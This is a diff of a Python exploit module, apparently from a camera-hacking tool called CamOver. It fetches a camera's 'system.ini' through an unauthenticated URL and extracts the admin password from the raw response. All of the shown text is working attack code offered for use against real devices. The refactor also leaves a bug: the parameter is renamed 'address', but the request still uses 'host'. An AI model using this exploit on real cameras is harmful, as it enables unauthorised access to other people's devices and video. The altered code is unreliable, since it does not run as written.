@@ -30,19 +30,19 @@ import requests
 
 class CamOver:
     @staticmethod
-    def connect(host):
+    def exploit(address):
         try:
-            response = requests.get(f"http://{host}/system.ini?loginuse&loginpas", verify=False, timeout=3)
+            response = requests.get(
+                f"http://{host}/system.ini?loginuse&loginpas",
+                verify=False,
+                timeout=3
+            )
         except Exception:
             return None
-        return response
 
-    @staticmethod
-    def exploit(response):
         if response.status_code == 200:
             strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
             if 'admin' in strings:
                 username_index = strings.index('admin')
                 password = strings[username_index + 1]
-                return password
-        return None
+                return 'admin', password
